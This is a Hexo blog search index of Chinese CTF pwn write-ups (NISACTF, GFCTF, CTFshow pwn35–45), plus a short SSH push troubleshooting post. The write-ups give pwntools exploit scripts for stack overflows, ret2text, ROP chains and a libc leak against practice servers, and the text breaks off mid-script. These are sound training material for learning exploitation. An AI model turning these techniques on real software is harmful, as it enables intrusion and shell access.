<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>一些ret2text题目</title>
      <link href="/2024/01/24/ret2text/"/>
      <url>/2024/01/24/ret2text/</url>
      
        <content type="html"><![CDATA[<h2 id="NISACTF-2022-ezpie"><a href="#NISACTF-2022-ezpie" class="headerlink" title="[NISACTF 2022]ezpie"></a>[NISACTF 2022]ezpie</h2><p>开启了pie保护，但每次运行程序都会打印出main函数的地址。存在gets函数并且没有开栈保护，考虑栈溢出</p><p>虽然每次地址都会重新加载，但是<code>system</code>函数和<code>main</code>函数之间的偏移是不会改变的，因此先计算出偏移，再根据给次给出的<code>main</code>的基地址就可以算出真实的<code>system</code>的地址</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28270</span>)</span><br><span class="line">offset=<span class="number">0x28</span>+<span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">main_addr=<span class="number">0x770</span></span><br><span class="line">system_addr=<span class="number">0x80f</span></span><br><span class="line">real_offset=system_addr-main_addr</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;gift!\n&quot;</span>)</span><br><span class="line">real_main=<span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#print(real_main)</span></span><br><span class="line">real_system=real_main+real_offset</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset+p32(real_system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="GFCTF-2021-where-is-shell"><a href="#GFCTF-2021-where-is-shell" class="headerlink" title="[GFCTF 2021]where_is_shell"></a>[GFCTF 2021]where_is_shell</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20240124104257367.png" alt="image-20240124104257367"></p><p>栈溢出，但是没有&#x2F;bin&#x2F;sh，其实可以考虑栈迁移写入，但是还没学那么深，这里明确一个小tips：</p><p>$0也可以当做&#x2F;bin&#x2F;sh使用，$0的机械码正好对应题目中tips的 \x24\x30</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20240124104455815.png" alt="image-20240124104455815"></p><p>从地址0x400541开始</p><p>64位注意传参的顺序及优先写入的寄存器</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./shell&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./shell&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;node5.anna.nssctf.cn&#x27;,28270)</span></span><br><span class="line">offset=<span class="number">0x10</span>+<span class="number">0x8</span></span><br><span class="line">sys_addr=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr=<span class="number">0x400541</span></span><br><span class="line">ret=<span class="number">0x0000000000400416</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x00000000004005e3</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset+p64(ret)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(sys_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决hexo本地上传报错之ssh连接</title>
      <link href="/2024/01/23/hexoproblem/"/>
      <url>/2024/01/23/hexoproblem/</url>
      
        <content type="html"><![CDATA[<p>近期本地博客上传遇到了以下报错：</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Please make sure you have the correct access rights</span><br><span class="line">and the repository exists.</span><br><span class="line">FATAL Something<span class="string">&#x27;s wrong. Maybe you can find the solution here: https://hexo.io/docs/troubleshooting.html</span></span><br><span class="line"><span class="string">Error: Spawn failed</span></span><br><span class="line"><span class="string">    at ChildProcess.&lt;anonymous&gt; (E:\Blog\Hexo\node_modules\hexo-util\lib\spawn.js:51:21)</span></span><br><span class="line"><span class="string">    at ChildProcess.emit (node:events:513:28)</span></span><br><span class="line"><span class="string">    at cp.emit (E:\Blog\Hexo\node_modules\cross-spawn\lib\enoent.js:34:29)</span></span><br><span class="line"><span class="string">    at ChildProcess._handle.onexit (node:internal/child_process:291:12)</span></span><br></pre></td></tr></table></figure></div><p>关键问题出在错误的第一行，git服务器没有成功发现存储在本地的ssh密钥或者说是本地的ssh密钥出现问题</p><p>测试发现确实连接失败</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20240123124721799.png" alt="image-20240123124721799"></p><p>查看本地的.ssh目录下的配制文件</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20240123124527185.png" alt="image-20240123124527185"></p><p>可以发现这里我因为vscode连ubuntu远程写代码导致之前的ssh配置被修改</p><p>直接下方添加域名：</p><div class="highlight-wrap" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">  HostName ssh.github.com</span><br><span class="line">  User d3f4u1t</span><br><span class="line">  Port 22</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20240125120809175.png" alt="image-20240125120809175"></p><p>再次连接，成功，本地文件也可以成功push</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20240123124758608.png" alt="image-20240123124758608"></p>]]></content>
      
      
      <categories>
          
          <category> 杂记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow 栈溢出</title>
      <link href="/2024/01/22/pwn35-80/"/>
      <url>/2024/01/22/pwn35-80/</url>
      
        <content type="html"><![CDATA[<h2 id="pwn35"><a href="#pwn35" class="headerlink" title="pwn35"></a>pwn35</h2><blockquote><p>strcpy函数没有长度限制，可以产生栈溢出</p></blockquote><p><code>cyclic</code>足够长度数据直接打</p><h2 id="pwn36"><a href="#pwn36" class="headerlink" title="pwn36"></a>pwn36</h2><blockquote><p>gets函数无长度限制，可以栈溢出</p></blockquote><p>这边需要让get_flag函数执行</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20240120165855101.png" alt="image-20240120165855101"></p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28105</span>)</span><br><span class="line">get_flag_addr=<span class="number">0x8048586</span></span><br><span class="line">offset=<span class="number">0x28</span>+<span class="number">0x4</span></span><br><span class="line">payload=offset*<span class="string">b&#x27;a&#x27;</span>+p32(get_flag_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="pwn37"><a href="#pwn37" class="headerlink" title="pwn37"></a>pwn37</h2><p>与上题相似</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28274</span>)</span><br><span class="line">backdoor=elf.sym[<span class="string">&#x27;backdoor&#x27;</span>]</span><br><span class="line">offset=<span class="number">0x12</span>+<span class="number">0x4</span></span><br><span class="line">payload=offset*<span class="string">b&#x27;a&#x27;</span>+p32(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="pwn38"><a href="#pwn38" class="headerlink" title="pwn38"></a>pwn38</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20240121152420772.png" alt="image-20240121152420772"></p><p>0xA+0x8，64位平衡堆栈</p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --only &quot;ret&quot;</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20240121160335278.png" alt="image-20240121160335278"></p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28278</span>)</span><br><span class="line">backdoor=elf.sym[<span class="string">&#x27;backdoor&#x27;</span>]</span><br><span class="line">offset=<span class="number">0xA</span>+<span class="number">0x8</span></span><br><span class="line">ret=<span class="number">0x400287</span></span><br><span class="line">payload=offset*<span class="string">b&#x27;a&#x27;</span>+p64(ret)+p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="pwn39"><a href="#pwn39" class="headerlink" title="pwn39"></a>pwn39</h2><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20240121160434623.png" alt="image-20240121160434623"></p><p>存在后门函数，但是<code>/bin/sh</code>没在<code>system</code>里</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20240121162736783.png" alt="image-20240121162736783"></p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload=[填充]+[system@plt]+[4bytes填充]+[参数]</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28274</span>)</span><br><span class="line">system=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">offset=<span class="number">0x12</span>+<span class="number">0x4</span></span><br><span class="line">binsh=<span class="number">0x8048750</span></span><br><span class="line">payload=offset*<span class="string">b&#x27;a&#x27;</span>+p32(system)+p32(<span class="number">0</span>)+p32(binsh)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="pwn40"><a href="#pwn40" class="headerlink" title="pwn40"></a>pwn40</h2><blockquote><p>64位和32位不同，参数不是直接放在栈上，而是优先放在寄存器rdi,rsi,rdx,rcx,r8,r9。这几个寄存器放不下时才会考虑栈。</p><p>64位汇编传参，当参数少于7个时， 参数从左到右放入寄存器: <em><strong>rdi, rsi, rdx, rcx, r8, r9</strong></em>。 当参数为7个以上时，前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</p></blockquote><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20240121164107195.png" alt="image-20240121164107195"></p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --only &#x27;pop|ret&#x27; | grep rdi</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20240121163526448.png" alt="image-20240121163526448"></p><div class="highlight-wrap" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --only &#x27;ret&#x27;</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20240121163615281.png" alt="image-20240121163615281"></p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload=[填充]+[pop_rdi_ret]+[参数]+[system@plt]</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28207</span>)</span><br><span class="line">system=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0xA</span>+<span class="number">0x8</span></span><br><span class="line">binsh=<span class="number">0x400808</span></span><br><span class="line">rdi_addr=<span class="number">0x00000000004007e3</span></span><br><span class="line">ret_addr=<span class="number">0x00000000004004fe</span></span><br><span class="line">payload=offset*<span class="string">b&#x27;a&#x27;</span>+p64(rdi_addr)+p64(binsh)+p64(ret_addr)+p64(system)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="pwn41"><a href="#pwn41" class="headerlink" title="pwn41"></a>pwn41</h2><p>没有<code>/bin/sh</code>，用<code>sh</code>代替</p><blockquote><ol><li><p>system(“&#x2F;bin&#x2F;sh”) ： </p><p>在Linux和类Unix系统中，&#x2F;bin&#x2F;sh 通常是一个符号链接，指向系统默认的shell程序（如Bash或Shell）。因此，使用 system(“&#x2F;bin&#x2F;sh”) 会启动指定的shell程序，并在新的子进程中执行。 </p><p>这种方式可以确保使用系统默认的shell程序执行命令，因为 &#x2F;bin&#x2F;sh 链接通常指向默认shell的可执行文件。 </p></li><li><p>system(“sh”) ：</p><p> 使用 system(“sh”) 会直接启动一个名为 sh 的shell程序，并在新的子进程中执行。 这种方式假设系统的环境变量 $PATH 已经配置了能够找到 sh 可执行文件的路径，否则可能会导致找不到 sh 而执行失败。</p></li></ol></blockquote><p>总结来说， <code>system(&quot;/bin/sh&quot;)</code>是直接指定了系统默认的shell程序路径来执行命令，而<code>system(&quot;sh&quot;)</code>则依赖系统的环境变量<code>$PATH</code> 来查找<code>sh</code>可执行文件并执行。如果系统的环境变量设置正确，这两种方式是等效的。</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28187</span>)</span><br><span class="line">system=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">offset=<span class="number">0x12</span>+<span class="number">0x4</span></span><br><span class="line">sh_addr=<span class="number">0x80487ba</span></span><br><span class="line">payload=offset*<span class="string">b&#x27;a&#x27;</span>+p32(system)+p32(<span class="number">0</span>)+p32(sh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="pwn42"><a href="#pwn42" class="headerlink" title="pwn42"></a>pwn42</h2><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28248</span>)</span><br><span class="line">system=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0xA</span>+<span class="number">0x8</span></span><br><span class="line">binsh=<span class="number">0x400872</span></span><br><span class="line">rdi_addr=<span class="number">0x0000000000400843</span></span><br><span class="line">ret_addr=<span class="number">0x000000000040053e</span></span><br><span class="line">payload=offset*<span class="string">b&#x27;a&#x27;</span>+p64(rdi_addr)+p64(binsh)+p64(ret_addr)+p64(system)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="pwn43"><a href="#pwn43" class="headerlink" title="pwn43"></a>pwn43</h2><p>无<code>/bin/sh</code>，考虑劫持gets函数然后人为写入</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20240121183608682.png" alt="image-20240121183608682"></p><p>直接查看可写的段</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/image-20240121183808441.png" alt="image-20240121183808441"></p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line">gets_plt=elf.plt[<span class="string">b&quot;gets&quot;</span>]</span><br><span class="line">sys_addr=elf.plt[<span class="string">b&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">bss_addr=<span class="number">0x804b800</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(<span class="number">0x6c</span>+<span class="number">4</span>)+p32(gets_plt)+p32(sys_addr)+p32(bss_addr)+p32(bss_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&quot;sh;&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><blockquote><p>栈溢出后劫持gets函数，调用system函数，第一个bss_addr作为gets的参数传入写入栈上，第二个bss_addr作为system的参数传入</p></blockquote><h2 id="pwn44"><a href="#pwn44" class="headerlink" title="pwn44"></a>pwn44</h2><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt=elf.plt[<span class="string">b&quot;gets&quot;</span>]</span><br><span class="line">sys=elf.plt[<span class="string">b&quot;system&quot;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x00000000004007f3</span></span><br><span class="line">buf=<span class="number">0x603000</span>-<span class="number">20</span></span><br><span class="line">ret=<span class="number">0x00000000004004fe</span></span><br><span class="line">payload=cyclic(<span class="number">0xA</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(buf)+p64(ret)+p64(gets_plt)+p64(pop_rdi)+p64(buf)+p64(ret)+p64(sys)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&quot;sh;&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><blockquote><p>1.利用 pop_rdi 指令将 buf2 的地址加载到rdi寄存器中，因为在调用gets函数之前，你需要将输入的缓冲区的地址（即buf2的地址）传递给gets函数，以便gets函数知道将输入数据存储在哪个缓冲区中<br>2.调用 gets 函数，以 buf2 的地址作为参数，从用户输入中读取数据，并将其存储在buf2中<br>3.再次利用 pop_rdi 指令将 buf2 的地址加载到rdi 寄存器中<br>4.调用 system 函数，以 buf2 的地址作为参数</p></blockquote><h2 id="pwn45"><a href="#pwn45" class="headerlink" title="pwn45"></a>pwn45</h2><p>无<code>system</code>无<code>/bin/sh</code>，存在write函数和puts函数，可以作为泄露libc的泄露函数</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;x8&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28221&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">offset = <span class="number">0x6B</span> + <span class="number">0x4</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">0</span>) + p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#write_addr = u32(p.recvuntil(&#x27;\xf7&#x27;)[-4:])</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span 